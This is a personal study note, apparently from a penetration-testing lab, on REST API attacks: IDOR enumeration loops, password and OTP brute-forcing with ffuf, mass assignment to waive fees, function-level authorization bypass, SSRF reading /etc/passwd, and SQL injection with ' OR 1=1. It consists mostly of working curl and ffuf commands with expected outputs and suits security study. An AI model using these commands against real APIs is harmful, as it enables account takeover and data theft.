---
Primary_category: "[[WEB TECHNOLOGIES]]"
title: "REST API"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WEB TECHNOLOGIES]]

#### *Theory*

***REST ( Representational State Transfer )*** is an architectural style used to design web *APIs* around resources that are accessed through *HTTP* endpoints

Clients interact with these resources using standard *HTTP* methods such as *GET*, *POST*, *PUT*, *PATCH* and *DELETE*, while  data is commonly exchanged in formats such as *JSON*

From a security perspective, ***[[BROKEN AUTHENTICATION|improper authentication]]*** , authorization, input validation or resource exposure can lead to vulnerabilities that allow attacker to access or manipulate data and functionality beyond their intended permissions

---

#### *BOLA*

> ***Broken Object Level Authorization***

> ***Also known as [[IDOR]]***

##### *Authorization Bypass through User-Controlled Key*

###### *Scenario*

> ***[CWE 639](https://cwe.mitre.org/data/definitions/639.html)***

Let's suppose that we manage to get valid credentials and authenticate to a *REST API* using the following endpoint →

```bash
/api/v1/authentication/suppliers/sign-in
```

![[REST API-20260921184311191.webp|450]]

> ***Zoom in***

```bash
curl --silent --show-error --location --request POST --header 'Content-Type: application/json' --data '{ "email" : "<EMAIL>", "password" : "<PASSWD>" }' '<TARGET>/api/v1/authentication/suppliers/sign-in' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --show-error --location --request POST --header 'Content-Type: application/json' --data '{ "email" : "john.doe@pwned.com", "password" : "password1234$!" }' 'http://154.57.164.82:30292/api/v1/authentication/suppliers/sign-in' | jq .
> ```
>

> [!TLDR]- *Expected Output*
>
> ```json
> {
 >  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi...<SNIP>..."
> }
> ```
>

After authenticating with an email and password, we receive a *JWT ( JSON Web Token )* that we can use for subsequent requests to different *API* endpoints to which we are authorized

Then, we enumerate an interesting endpoint through the *Swagger* interface:

```bash
/api/v1/roles/current-user
```

![[REST API-20260921185815163.webp|450]]

> ***Zoom in***

```bash
curl --show-error --silent --location --request GET --header 'Authorization: Bearer <JWT>' '<TARGET>/api/v1/roles/current-user' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --show-error --silent --location --request GET --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi...<SNIP>...' 'http://154.57.164.82:30292/api/v1/roles/current-user' | jq . 
> ```
>

> [!TLDR]- *Expected Output*
>
> ```json
> {
>   "roles": [
>     "SupplierCompanies_GetYearlyReportByID"
>   ]
> }
> ```
>

The endpoint above allows us to list our current roles, namely **`SupplierCompanies_GetYearlyReportByID`**

Based on the role name, it seems that we may have permissions to retrieve an annual report for the company we work for

While inspecting other endpoints, we came across the endpoint we were talking about

```bash
/api/v1/supplier-companies/yearly-reports/{ID}
```

![[REST API-20260921191205797.webp|450]]

> ***Zoom in***

The problem here is that it requires an *ID* field, which we do not know. However, we could start with *1* to see what happens

```bash
curl --show-error --silent --location --request GET --header 'Authorization: Bearer <JWT>' '<TARGET>/api/v1/supplier-companies/yearly-reports/1' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --show-error --silent --location --request GET --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi...<SNIP>...' 'http://154.57.164.82:30292/api/v1/supplier-companies/yearly-reports/1' | jq . 
> ```
>

> [!TLDR]- *Expected Output*
>
> ```json
> {
>   "supplierCompanyYearlyReport": {
>     "id": 1,
>     "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
>     "year": 2020,
>     "revenue": 794425112,
>     "commentsFromCLevel": "Superb work! The Board is over the moon! All employees will enjoy a dream vacation!"
>   }
> }
> ```
>

We could think that we get a valid response because the given *ID* belongs to our company

However, if we try with a different *ID*

![[REST API-20260921191902860.webp|450]]

> ***Zoom in***

We get valid information again...

From there, we could proceed as follows to retrieve information from all existing companies

```bash
for _id in {1..100} ; do curl --show-error --silent --location --request GET --header 'Authorization: Bearer <JWT>' "<TARGET>/api/v1/supplier-companies/yearly-reports/${_id}" | jq . ; done
```

> [!DANGER]- *e.g.*
>
> ```bash
> for _id in {1..100} ; do curl --show-error --silent --location --request GET --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi...<SNIP>...' "http://154.57.164.82:30292/api/v1/supplier-companies/yearly-reports/${_id}" | jq . ; done
> ```
>

> [!TLDR]- *Expected Output*
>
> ```json
> <SNIP>
> {
>   "supplierCompanyYearlyReport": {
>     "id": 4,
>     "companyID": "058ac1e5-3807-47f3-b546-cc069366f8f9",
>     "year": 2022,
>     "revenue": 893748309,
>     "commentsFromCLevel": "Outstanding effort! The Board is in awe! Everyone receives a week-long retreat!"
>   }
> }
> {
>   "supplierCompanyYearlyReport": {
>     "id": 5,
>     "companyID": "d0826865-6518-41e8-afb8-84bb35c701c0",
>     "year": 2020,
>     "revenue": 563231796,
>     "commentsFromCLevel": "Amazing performance! The Board is ecstatic! Get ready for an all-expenses-paid vacation!"
>   }
> }
> <SNIP>
> ```
>

###### *Conclusion*

This implementation presents several problems →

- ***Insecure Direct Object Reference ( IDOR )***

In the vulnerable endpoint, companies are identified by an *ID* consisting of at least *1 digit*, which is easy to guess

Instead, a *GUID* should be used to identify an existing company in this case, which is practically impossible to guess

This would reduce the probability of exploit the remaining security flaw

- ***Broken Object Level Authorization***

In this case, an authenticated user should only be able to retrieve information from their own company, and not about others' companies as well
 
So, we can say that the *REST API's RBAC* is poorly designed in this specific aspect

---

#### *Broken Authentication*

> ***[[BROKEN AUTHENTICATION|Broken Authentication]]***

##### *Improper Restriction of Excessive Authentication Attempts*

> ***[CWE-307](https://cwe.mitre.org/data/definitions/307.html)***

As with ***[[#BOLA|BOLA]]***, we manage to retrieve valid credentials for authenticate ourselves to the given *REST API* as a certain customer

```bash
curl --silent --show-error --location --request POST --header 'Content-Type: application/json' --data '{ "email" : "<EMAIL>", "password" : "<PASSWD>" }' 'http://154.57.164.82:30945/api/v1/authentication/customers/sign-in' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --show-error --location --request POST --header 'Content-Type: application/json' --data '{ "email" : "john.doe@pwnd.com", "password" : "password1234$!" }' 'http://154.57.164.82:30945/api/v1/authentication/customers/sign-in' | jq . 
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> {
  > "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi...<SNIP>..."
> } 
> ```
>

Once we obtain the *JWT*, we can use it to access any *REST API* endpoint to which our current user has access

Next, we can enumerate which roles the current user has:

```bash
curl --silent --show-error --location --request GET --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi...<SNIP>...' '<TARGET>/api/v1/roles/current-user' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --show-error --location --request GET --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi...<SNIP>...' 'http://154.57.164.82:30945/api/v1/roles/current-user' | jq .
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> {
>   "roles": [
>     "Customers_UpdateByCurrentUser",
>     "Customers_Get",
>     "Customers_GetAll"
>   ]
> }
> ```
>

We have several assigned roles. Moreover, it seems that we have permission to update our user data based on the name of **`UpdateByCurrentUser`** role

After doing a little research throughout the *Swagger* interface, we come across the following endpoint

```bash
/api/v1/customers/current-user
```

![[REST API-20260921201926371.webp|450]]

> ***Zoom in***

And we were right! We can use this endpoint to update our current user's data.

To do so, we create a *data.json* file containing all necessary information required by the endpoint to update our user data

> [!IMPORTANT]- *data.json*
>
> ```json
> {
>   "UpdatedCustomer": {
>     "Name": "john Doe",
>     "Email": "john.doe@pwned.com",
>     "PhoneNumber": "93654485588479205583429884263060522230848182545603370889159097530545650201094612811215309442542734914",
>     "BirthDate": "2001-09-22",
>     "Password": "22"
>   }
> }
> ```
>

```bash
curl --silent --show-error --location --request PATCH --data '<JSON_DATA>' --header 'Content-Type: application/json' --header 'Authorization: Bearer <JWT>' '<TARGET>/api/v1/customers/current-user' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --show-error --location --request PATCH --data '@./data.json' --header 'Content-Type: application/json' --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwO...<SNIP>' 'http://154.57.164.73:31956/api/v1/customers/current-user' | jq .
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> {
>   "StatusCode": 400,
>   "Message": "One or more errors occurred!",
>   "Errors": {
>     "UpdatedCustomer.Password": [
>       "Password must be at least 6 characters long"
>     ]
>   }
> }
> ```
>

We receive a *400 error* indicating that the *Password must be at least 6 characters long*

So, we now know the password policy of the given *REST API*. We could assume that some customers were registered with a 6-character password

If so, we could try to brute-force the password of one or several specific users, whether they are customers or suppliers

Therefore, we could proceed as follows by attacking the endpoint bellow knowing that we receive a **`Invalid Credentials.`** message with wrong credentials

```bash
/api/v1/authentication/customers/sign-in
```

![[REST API-20260922160610257.webp|450]]

> ***Zoom in***

> ***It's required to know at least one user to be able to brute-force their password***

```bash
ffuf -v -w '<WORDLIST>' -X POST -H 'Content-Type: application/json' --data '{ "email" : "<EMAIL>", "password" : "FUZZ" }' -u '<TARGET>/api/v1/authentication/customers/sign-in' -fr '<ERROR_MESSAGE>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> ffuf -v -w '/usr/share/seclist/Passwords/xato-net-10-million-passwords-10000.txt' -X POST -H 'Content-Type: application/json' --data '{ "email" : "john.snow@pwned.com", "password" : "FUZZ" }' -u 'http://154.57.164.73:31956/api/v1/authentication/customers/sign-in' -fr 'Invalid Credentials'
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> [Status: 200, Size: 393, Words: 1, Lines: 1, Duration: 81ms]
>     * EMAIL: john.snow@pwned.com
>     * PASS: qwerasdfzxcv
> ```
>

Similarly, assuming that there is an endpoint that allows a user to reset its password by providing a valid *OTP* previously generated

```bash
/api/v1/authentication/customers/passwords/resets
```

![[REST API-20260922171526351.webp|450]]

> ***Zoom in***

Again, knowing a valid email account related to an existing user, we can use the endpoint below first to generate a valid *OTP* code that will be send to the email account in question

```bash
/api/v1/authentication/customers/passwords/resets/email-otps
```

![[REST API-20260922171720859.webp|450]]

> ***Zoom in***

```bash
curl --silent --show-error --location --request POST --header 'Content-Type: application/json' --data '{ "email" : "<EMAIL>" }' '<TARGET>/api/v1/authentication/customers/passwords/resets/email-otps' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --show-error --location --request POST --header 'Content-Type: application/json' --data '{ "email" : "john.snow@pwned.com" }' 'http://154.57.164.82:31067/api/v1/authentication/customers/passwords/resets/email-otps' | jq .
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> {
> 	"SuccessStatus": true
> }
> ```
>

Then, it's as simple as trying to brute-force the given *OTP* using the first endpoint

```bash
/api/v1/authentication/customers/passwords/resets
```

Since we do not know how long these *OTP* codes are, we can start with *4 digits*. Moreover, we should send a request with an invalid *OTP* fist to get the message we have to filter

```bash
ffuf -v -w <( seq -w 0 9999 ) -X POST -H 'Content-Type: application/json' --data '{ "email" : "<EMAIL>", "OTP" : "FUZZ", "NewPassword" : "<PASSWD>" }' -u '<TARGET>/api/v1/authentication/customers/passwords/resets' -fr 'false'
```

> [!DANGER]- *e.g.*
>
> ```bash
> ffuf -v -w <( seq -w 0 9999 ) -X POST -H 'Content-Type: application/json' --data '{ "email" : "john.snow@pwned.com", "OTP" : "FUZZ", "NewPassword" : "password1234$!" }' -u 'http://154.57.164.82:31067/api/v1/authentication/customers/passwords/resets' -fr 'false'
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> [Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 63ms]
> | URL | http://154.57.164.82:31067/api/v1/authentication/customers/passwords/resets
> 	* FUZZ: 1278
> ```
>

And we successfully changed the account's password. So now we can authenticate ourselves as the given user

---

#### *Broken Object Property Level Authorization*

This category encompasses to subclasses:

- ***Excessive Data Exposure***

- ***[[WEB MASS ASSIGNMENT|Mass Assignment]]***

##### *Exposure of Sensitive Information due to Incompatible Policies*

> ***[CWE-213](https://cwe.mitre.org/data/definitions/213.html)***

As with previous examples, we manage to retrieve valid credentials to authenticate to the *REST API* we are evaluating

So first, we use the endpoint below to sign-in as the given account and obtain a *JWT* that we can use for subsequent requests to other *REST API* endpoints

```bash
/api/v1/authentication/customers/sign-in
```

![[REST API-20260922175152986.webp|450]]

> ***Zoom in***

```bash
curl --silent --show-error --location --request POST --header 'Content-Type: application/json' --data '{ "email" : "<EMAIL>", "password" : "<PASSWD>" }' '<TARGET>/api/v1/authentication/customers/sign-in' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --show-error --location --request POST --header 'Content-Type: application/json' --data '{ "email" : "john.doe@pwned.com", "password" : "password1234$!" }' 'http://154.57.164.82:30292/api/v1/authentication/customers/sign-in' | jq .
> ```
>

> [!TLDR]- *Expected Output*
>
> ```json
> {
 >  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi...<SNIP>..."
> }
> ```
>

Once authenticated, we can check which roles have been assigned to the current user usign the following endpoint

```bash
/api/v1/roles/current-user
```

![[REST API-20260922175634506.webp|450]]

> ***Zoom in***

```bash
curl --silent --show-error --location --request GET --header 'Authorization: Bearer <JWT>' '<TARGET>/api/v1/roles/current-user' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --show-error --location --request GET --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi...<SNIP>...' 'http://154.57.164.82:30292/api/v1/roles/current-user' | jq .
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> {
>   "roles": [
>     "Suppliers_Get",
>     "Suppliers_GetAll"
>   ]
> }
> ```
>

It seems that these roles allows us to list one or all of the suppliers. To do so, we can use the endpoint below

```bash
/api/v1/suppliers
```

![[REST API-20260922180317077.webp|450]]

> ***Zoom in***

```bash
curl --silent --show-error --location --request GET --header 'Authorization: Bearer <JWT>' '<TARGET>/api/v1/suppliers' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --show-error --location --request GET --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwO...<SNIP>...' 'http://154.57.164.78:32026/api/v1/suppliers' | jq . 
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> <SNIP>
> {
>       "id": "5d489453-3538-4973-9479-2c37b2a5db73",
>       "companyID": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
>       "name": "HTBPentester11",
>       "email": "htbpentester11@pentestercompany.com",
>       "phoneNumber": "+44 9998 999992"
> },
> <SNIP>
> ```
>

And we have verified that we can retrieve information for any existing supplier. In this case, the problem is that some sensitive information is disclosed here, namely the contained within the *email* and *phoneNumber* fields

This information should not be exposed to customers

To mitigate the *Excessive Data Exposure*, the given endpoint should only return fields necessary from the customer's perspective

##### *Improperly Controlled Modification of Dinamically-Determined Object Attributes*

> ***[CWE-915](https://cwe.mitre.org/data/definitions/915.html)***

This time we have another set of credentials that we can use again to authenticate to a specific *REST API* endpoint to receive a *JWT* for subsequent perform actions such as enumerate our roles

> ***See [[#Exposure of Sensitive Information due to Incompatible Policies]]***

Now we have the roles below →

```json
{
  "roles": [
    "SupplierCompanies_Update",
    "SupplierCompanies_Get"
  ]
}
```

It seems that they allow us to either modify data related to a supplier's company and list the supplier's company data

Since we have *UPDATE* privileges, we should list which data we can update first

To do so, we can leverage the endpoint below to retrieve data related to the company the current supplier work for

```bash
/api/v1/supplier-companies/current-user
```

![[REST API-20260922183457029.webp|450]]

> ***Zoom in***

```bash
curl --silent --show-error --location --request GET --header 'Authorization: Bearer <JWT>' '<TARGET>/api/v1/supplier-companies/current-user' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --show-error --location --request GET --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwO...<SNIP>...' 'http://154.57.164.78:32026/api/v1/supplier-companies/current-user' | jq . 
> ```
>

> [!TLDR]- *Expected Output*
>
> ```json
> {
>   "supplierCompany": {
>     "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
>     "name": "PentesterCompany",
>     "email": "supplier@pentestercompany.com",
>     "isExemptedFromMarketplaceFee": 0,
>     "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
>   }
> }
> ```
>

We see that there is a field called **`isExemptedFromMarketplaceFee`**, which makes the company paying a fee to the marketplace for each sale if the value is `0`, as it's the case

Therefore, we could check if we are able to modify this field to set its value to `1`  and thus avoid paying the fee to the marketplace

To do so, we can use the endpoint below related to the **`SupplierCompanies_Update`** role

```bash
/api/v1/supplier-companies
```

![[REST API-20260922184921965.webp|450]]

> ***Zoom in***

Based on the picture above, it seems that we can modify the given fee *field*

The following *JSON* data will be send along with the *JWT* previously generated

```bash
{
  "UpdatedSupplierCompany": {
    "SupplierCompanyID": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "IsExemptedFromMarketplaceFee": 1,
    "CertificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
  }
}
```

```bash
curl --silent --show-error --location --request PATCH --data '@<JSON_FILE>' --header 'Content-Type: application/json' --header 'Authorization: Bearer <JWT>' '<TARGET>/api/v1/supplier-companies' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --show-error --location --request PATCH --data '@./data.json' --header 'Content-Type: application/json' --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwO...<SNIP>...' 'http://154.57.164.78:32026/api/v1/supplier-companies' | jq .
> ```
>

> [!TLDR]- *Expected Output*
>
> ```json
> {
> 	 "successStatus": true
> }
> ```
>

We can verify the updated fields by requesting again our company's information

![[REST API-20260922185746189.webp|450]]

> ***Zoom in***

And we're exempt from paying fees!

---

#### *BFLA*

> ***Broken Function Level Authorization***

The differente between ***[[#BOLA]]*** and *BFLA* is that, in the case of *BOLA*, the user is authorized to interact with the vulnerable endpoint, whereas in the case of *BFLA*, the user is not

##### *Exposure of Sensitive Information to an Unauthorized Actor*

> ***[CWE-200](https://cwe.mitre.org/data/definitions/200.html)***

Once we have valid credentials, we can use them to authenticate to a specific *REST API* endpoint to receive a *JWT*, which represents the identity of the given account

```bash
/api/v1/authentication/customers/sign-in
```

![[REST API-20260922194157083.webp|450]]

> ***Zoom in***

```bash
curl --silent --show-error --location --request POST --header 'Content-Type: application/json' --data '{ "email" : "<EMAIL>", "password" : "<PASSWD>" }' '<TARGET>/api/v1/authentication/customers/sign-in' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --show-error --location --request POST --header 'Content-Type: application/json' --data '{ "email" : "john.doe@pwned.com", "password" : "password1234$!" }' 'http://154.57.164.82:30292/api/v1/authentication/customers/sign-in' | jq .
> ```
>

> [!TLDR]- *Expected Output*
>
> ```json
> {
 >  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi...<SNIP>..."
> }
> ```
>

Once authenticated, we can check which roles have been assigned to the current user usign the following endpoint

```bash
/api/v1/roles/current-user
```

![[REST API-20260922175634506.webp|450]]

> ***Zoom in***

```bash
curl --silent --show-error --location --request GET --header 'Authorization: Bearer <JWT>' '<TARGET>/api/v1/roles/current-user' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --show-error --location --request GET --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi...<SNIP>...' 'http://154.57.164.82:30292/api/v1/roles/current-user' | jq .
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> {
>	"errorMessage": "User does not have any roles assigned"
> }
> ```
>

This time, the current user does not have any roles assigned

However, we should check all endpoints even if we do not have access as the *REST API's RBAC* may not be properly implemented on a specific endpoint

For instance, when listing endpoints, we find the following →

```bash
/api/v1/products/discounts
```

![[REST API-20260922194745825.webp|450]]

> ***Zoom in***

At first, we see that it requires the user in question be assigned the **`ProductDiscounts_GetAll`** role in order to interact

As stated, our current user has no roles, however, we can try to interact with this endpoint to see if the *Role-based Access Control* is properly implemented on it

```bash
curl --silent --show-error --location --request GET --header 'Authorization: Bearer <JWT>' '<TARGET>/api/v1/products/discounts' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --show-error --location --request GET --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi...<SNIP>...' 'http://154.57.164.82:30292/api/v1/products/discounts' | jq .
> ```
>

> [!TLDR]- *Expected Output*
>
> ```json
> <SNIP>
> {
>       "productID": "31484482-816d-40cd-8680-fdfd044eeab2",
>       "ratePercentage": 50,
>       "startDate": "2023-01-15",
>       "endDate": "2023-04-25"
> },
> <SNIP>
> ```
>

And we retrieve all the existing discounts, therefore we can conclude that they did not implement the *role-based access control* check

---

#### *Server-Side Request Forgery*

> ***[[SSRF]]***

> ***[CWE-918](https://cwe.mitre.org/data/definitions/918.html)***

As with most previous examples in this note, we must have valid credentials to authenticate to a specific *REST API* endpoint and obtain a *JWT* for further actions

After authenticating, existing roles for the current user should be enumerated

```json
{
  "roles": [
    "SupplierCompanies_Update",
    "SupplierCompanies_UploadCertificateOfIncorporation"
  ]
}
```

This time we have these roles assigned, which are related to the endpoints below, respectively

```bash
/api/v1/supplier-companies
/api/v1/supplier-companies/certificates-of-incorporation
```

But first, we should know to which company the current supplier works for. To do so →

> ***Required Endpoint***

```bash
/api/v1/supplier-companies/current-user
```

![[REST API-20260922202248537.webp|450]]

> ***Zoom in***

```bash
curl --silent --show-error --location --request GET --header 'Authorization: Bearer <JWT>' '<TARGET>/api/v1/supplier-companies/current-user' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --show-error --location --request GET --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwO...<SNIP>...' 'http://154.57.164.82:32016/api/v1/supplier-companies/current-user' | jq . 
> ```
>

> [!TLDR]- *Expected Output*
>
> ```json
> {
>   "supplierCompany": {
>     "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
>     "name": "PentesterCompany",
>     "email": "supplier@pentestercompany.com",
>     "isExemptedFromMarketplaceFee": 0,
>     "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
>   }
> }
> ```
>

Once we know the *ID* of the given company, we can interact with the endpoint responsible for uploading a certificate, namely **`/api/v1/supplier-companies/certificates-of-incorporation`**

![[REST API-20260923155309594.webp|450]]

> ***Zoom in***

In this case, as a *SWAGGER* interface is available under **`/swagger`**, we can leverage it to upload a *Certificate of Incorporation* by providing our company's *ID*, such as follows

![[REST API-20260923155856429.webp|450]]

> ***Zoom in***

We receive the following response →

```json
{
  "successStatus": true,
  "fileURI": "file:///app/wwwroot/SupplierCompaniesCertificatesOfIncorporations/blank.pdf",
  "fileSize": 4911
}
```

The uploaded certificate is stored under the path above using a **`file://`** scheme

If we keep enumerating the *SWAGGER* interface, we come across an endpoint that retrieves our company's *base64-encoded* certificate 

```bash
/api/v1/supplier-companies/{ID}/certificates-of-incorporation
```

![[REST API-20260923160615339.webp|450]]

> ***Zoom in***

```bash
curl --silent --show-error --location --request GET --header 'Authorization: Bearer <JWT>' '<TARGET>/api/v1/supplier-companies/<COMPANY_ID>/certificates-of-incorporation' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --show-error --location --request GET --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwO...<SNIP>...' 'http://154.57.164.82:31098/api/v1/supplier-companies/b75a7c76-e149-4ca7-9c55-d9fc4ffa87be/certificates-of-incorporation' | jq .
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> {
>   "successStatus": true,
>   "base64Data": "JVBERi0xLjYNJe+/ve+/ve+/ve+/...<SNIP>....="
> }
> ```
>

Furthermore, we have another endpoint where we can update a supplier company information

```bash
/api/v1/supplier-companies
```

![[REST API-20260923161109294.webp|450]]

> ***Zoom in***

If we look closely, we'll see that we can update the certificate's *URL* via this endpoint

Since we know that the *URL* begins with **`file://`** - which allows to retrieve the content of an existing file system - and there is an endpoint that allows us to retrieve the *base64-encoded* content of the given certificate as well, what if we replace the certificate's *URI* with the path to a file in the system in question?

For instance, we could update the given *URL* with **`/etc/passwd`** and see what happens if we retrieve the supplier's company data

To do this, we have to create a *JSON* file corresponding to the *HTTP* request's body, which contains all the required information to carry out the update operation

```json
{
  "UpdatedSupplierCompany": {
    "SupplierCompanyID": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "IsExemptedFromMarketplaceFee": 1,
    "CertificateOfIncorporationPDFFileURI": "file:///etc/passwd"
  }
}
```

```bash
curl --silent --show-error --location --request PATCH --data '@./supplierCompany.json' --header 'Content-Type: application/json' --header 'Authorization: Bearer <JWT>' '<TARGET>/api/v1/supplier-companies' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> url --silent --show-error --location --request PATCH --data '@./supplierCompany.json' --header 'Content-Type: application/json' --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwO...<SNIP>...' 'http://154.57.164.82:31098/api/v1/supplier-companies' | jq . 
> ```
>

> [!TLDR]- *Expected Output*
>
> ```json
> {
> 	 "successStatus": true
> }
> ```
>

Then, we retrieve the certificate's *base64-encoded* content, which should be the content of the **`/etc/passwd`** file if it's vulnerable

![[REST API-20260923162608665.webp|450]]

> ***Zoom in***

---

#### *Security Misconfiguration*

##### *SQL Injection*

> ***[CWE-89](https://cwe.mitre.org/data/definitions/89.html)***

Having valid credentials to authenticate to a specific *REST API* endpoint, we can provide the resulting *JWT* to the endpoint below to enumerate the current user's roles

```bash
/api/v1/roles/current-user
```

![[REST API-20260923165708815.webp|450]]

> ***Zoom in***

```bash
curl --show-error --silent --location --request GET --header 'Authorization: Bearer <JWT>' '<TARGET>/api/v1/roles/current-user' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --show-error --silent --location --request GET --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi...<SNIP>...' 'http://154.57.164.82:30292/api/v1/roles/current-user' | jq . 
> ```
>

> [!TLDR]- *Expected Output*
>
> ```json
> {
>   "roles": [
>     "Products_GetProductsTotalCountByNameSubstring"
>   ]
> }
> ```
>

Based on the name of the role, we can infer that there may be an endpoint that returns the number of products whose names contain the string provided by the user

And it is! Namely →

```bash
/api/v1/products/{Name}/count
```

![[REST API-20260923170136958.webp|450]]

> ***Zoom in***

For instance, if we want to know how many products whose name contains the string *lap* exist, simply proceed as follows

```bash
curl --silent --show-error --location --request GET --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjEyQHBlbnRlc3RlcmNvbXBhbnkuY29tIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiUHJvZHVjdHNfR2V0UHJvZHVjdHNUb3RhbENvdW50QnlOYW1lU3Vic3RyaW5nIiwiZXhwIjoxNzkwMTc2NTI5LCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9._fhuexrWIsATvsohGyxWwcN9yIVxJQ4c48kKCS55BOT5zSVN1j-Ql_QWRwUnWM9ir0vYtasr8Vb5w9mSaGsLfw' 'http://154.57.164.82:32595/api/v1/products/lap/count' | jq .
```

> [!DANGER]- *e.g.*
>
> ```bash
> curl --silent --show-error --location --request GET --header 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwO...<SNIP>...' 'http://154.57.164.82:32595/api/v1/products/lap/count' | jq .
> ```
>

> [!TLDR]- *Expected Output*
>
> ```json
> {
>   "productsCount": 18
> }
> ```
>

It seems that the web app is carrying out some type of matching query when receives a request to the endpoint in question

Therefore, we could test for a possible injection if it does not validate and sanitize the user input properly

So, we could try to inject a **`'`** ( Simple quote ) followed by a more complex payload to verify the injection if exists

```bash
http://154.57.164.82:32595/api/v1/products/'/count
```

![[REST API-20260923170809811.webp|450]]

> ***Zoom in***

And we receive an error. However, if we make the resulting query true:

```bash
http://154.57.164.82:32595/api/v1/products/%27%20OR%201%3D1%20--%20-/count
```

> ***i.e.*** **`/' OR 1=1 -- -/`**

We receive the entire inventory of products

![[REST API-20260923171157710.webp|450]]

> ***Zoom in***

So, we can confirm that this endpoint is vulnerable to *SQL Injection*